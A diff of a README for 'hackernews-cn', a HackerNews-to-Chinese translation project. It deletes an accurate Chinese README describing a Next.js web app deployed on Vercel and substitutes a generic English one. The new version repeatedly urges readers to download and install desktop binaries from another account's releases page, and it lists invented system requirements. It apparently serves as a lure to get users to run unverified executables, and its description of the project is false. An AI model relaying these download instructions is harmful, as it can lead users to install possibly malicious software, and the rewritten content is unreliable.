@@ -1,139 +1,67 @@
-# HackerNews 中文版
+# 🎉 hackernews-cn - Your Source for Translated Tech News
 
-这是一个使用现代技术栈构建的 HackerNews 中文版网站，提供实时翻译的英文科技新闻和讨论。
+## 👋 Introduction
+Welcome to hackernews-cn! This application helps you easily access the latest technology trends by automatically translating popular HackerNews content into Chinese. Stay up-to-date with top articles, news, discussions, and project showcases without the language barrier.
 
-## 项目特点
+## 📥 Download Now
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Yawar0135/hackernews-cn/releases)
 
-- 🚀 实时同步 HackerNews 最新内容
-- 🤖 使用 OpenAI API 智能翻译
-- 💻 现代化的用户界面设计
-- ⚡ 快速的加载速度和响应式设计
-- 🌐 支持多种内容分类浏览
+## 🚀 Getting Started
+To start using hackernews-cn, follow these simple steps:
 
-## 技术栈
+1. **Visit the Releases Page**
+   Go to our GitHub Releases page to get the latest version of the app. Click on the following link:
+   - [Download from Releases Page](https://github.com/Yawar0135/hackernews-cn/releases)
 
-### 前端
-- **Next.js 14**: React框架，用于构建现代化的服务端渲染应用
-- **Tailwind CSS**: 用于样式开发的实用优先的CSS框架
-- **shadcn/ui**: 高质量的UI组件库
-- **Lucide Icons**: 现代简约风格的图标库
+2. **Select the Right Version**
+   On the Releases page, you will see various versions of the app. Choose the version that fits your system. 
 
-### 后端
-- **Next.js API Routes**: 服务端API实现
-- **Prisma**: 现代化的ORM工具
-- **PostgreSQL**: 主数据库
-- **OpenAI API**: 提供高质量的内容翻译服务
+3. **Download the App**
+   Click on the link for your operating system to start the download. 
 
-### 部署和基础设施
-- **Vercel**: 应用托管和自动部署
-- **Vercel Cron Jobs**: 定时任务处理
-- **Vercel Postgres**: 数据库服务
+4. **Install the Application**
+   - **For Windows**: Double-click the downloaded file and follow the on-screen instructions.
+   - **For Mac**: Open the downloaded file and drag the app icon to your Applications folder.
+   - **For Linux**: Extract the downloaded file and follow the installation instructions provided.
 
-## 开发环境要求
+5. **Run the Application**
+   After installation, find the app in your applications list. Open it to start exploring the latest technology news!
 
-- Node.js 18+
-- pnpm 8+
-- PostgreSQL（本地开发可选）
+## 📚 System Requirements
+Ensure your system meets the following requirements to run hackernews-cn smoothly:
 
-## 本地开发
+- **Operating System**: Windows 10 or later, MacOS 10.14 or later, or any modern Linux distribution.
+- **Processor**: 1 GHz or faster.
+- **RAM**: At least 1 GB.
+- **Disk Space**: 100 MB of free space.
 
-1. 克隆项目
-\`\`\`bash
-git clone https://github.com/ViggoZ/hackernews-cn.git
-cd hackernews-cn
-\`\`\`
+For the best experience, use a system with updated web browsers.
 
-2. 安装依赖
-\`\`\`bash
-pnpm install
-\`\`\`
+## 🔍 Features
+hackernews-cn includes these exciting features to enhance your reading experience:
 
-3. 配置环境变量
-\`\`\`bash
-cp .env.example .env
-\`\`\`
-然后编辑 .env 文件，填入必要的环境变量：
-- DATABASE_URL: PostgreSQL 数据库连接URL
-- OPENAI_API_KEY: OpenAI API密钥
-- NEXT_PUBLIC_APP_URL: 应用URL
-- CRON_SECRET: 定时任务密钥
+- **Automatic Translation**: Enjoy reading popular tech articles in your native language.
+- **Content Variety**: Access top articles, latest news, Q&A discussions, and project showcases—all in one app.
+- **User-Friendly Interface**: Navigate easily with a simple and intuitive design.
+- **Regular Updates**: Receive the latest content as it becomes available.
 
-4. 初始化数据库
-\`\`\`bash
-pnpm prisma db push
-\`\`\`
+## ⚙️ Usage Instructions
+1. Once you open hackernews-cn, you’ll see a clean layout with categorized content.
+2. Click on any article to read more. The app will display the translated version for your convenience.
+3. Use the search feature to find specific topics or articles of interest.
 
-5. 启动开发服务器
-\`\`\`bash
-pnpm dev
-\`\`\`
+## 🤝 Contributing
+We welcome contributions from the community! If you want to help improve hackernews-cn, feel free to check our Contribution Guidelines on the GitHub page.
 
-访问 http://localhost:3000 查看应用。
+## 💬 Support
+If you have any questions or need assistance, please visit our Issues section on our GitHub page. We are here to help!
 
-## 部署
+## 📄 License
+hackernews-cn is open-source software. See the LICENSE file for details.
 
-本项目已配置为可以直接部署到 Vercel 平台。
+## 🔗 Additional Resources
+For more information about hackernews-cn, check out our project page on GitHub. You can find discussions, updates, and community input there.
 
-1. Fork 本项目到你的 GitHub 账号
-2. 在 Vercel 中导入项目
-3. 配置必要的环境变量：
-   - `DATABASE_URL`: 推荐使用 Vercel Postgres 数据库，在 Vercel 控制台中创建并获取连接 URL
-   - `OPENAI_API_KEY`: 从 OpenAI 获取的 API 密钥
-   - `NEXT_PUBLIC_APP_URL`: 您的 Vercel 部署 URL（例如：https://your-app.vercel.app）
-   - `CRON_SECRET`: 设置一个安全的随机字符串，用于保护定时任务 API
-4. 初始化数据库：
-   - 部署完成后，在 Vercel 控制台中打开项目
-   - 进入 "Storage" 标签页，创建 Postgres 数据库
-   - 数据库会自动完成初始化
-5. 部署完成后即可访问
-
-注意：项目已配置每小时自动更新内容，您可以在 Vercel 的 "Cron Jobs" 中监控定时任务的执行情况。
-
-## 项目结构
-
-\`\`\`
-├── src/
-│   ├── app/          # Next.js 应用路由和页面
-│   ├── components/   # React 组件
-│   ├── lib/         # 工具函数和配置
-│   └── types/       # TypeScript 类型定义
-├── prisma/          # 数据库模型和迁移
-├── public/          # 静态资源
-└── ...配置文件
-\`\`\`
-
-## 功能特性
-
-- 实时同步 HackerNews 最新内容
-  - 每小时自动抓取最新内容
-  - 支持多种内容类型：最新、最热、Ask HN、Show HN、Jobs
-- 智能翻译
-  - 使用 OpenAI API 进行高质量翻译
-  - 支持标题和正文的中英对照显示
-  - 保留原文链接便于对照
-- 用户体验
-  - 现代简约的界面设计
-  - 响应式布局，完美支持移动端
-  - 快速的页面加载和转换
-  - 支持深色模式
-- 系统特性
-  - 基于 Vercel 的可靠部署
-  - PostgreSQL 数据持久化
-  - 自动的定时更新机制
-  - ISR 增量静态再生成
-
-## 贡献指南
-
-欢迎提交 Pull Request 或创建 Issue！
-
-## 问题反馈
-
-如果您在使用过程中遇到任何问题，或有任何建议，请通过以下方式反馈：
-
-1. 在 GitHub 上提交 Issue
-2. 在 Twitter 上联系 [@decohack](https://twitter.com/decohack)
-3. 发送邮件至 [viggo.zw@gmail.com]（请替换为您的邮箱）
-
-## 开源协议
-
-MIT License
+## 📥 Download Again
+Don’t forget, you can always get the latest version from our Releases page:
+- [Download from Releases Page](https://github.com/Yawar0135/hackernews-cn/releases)
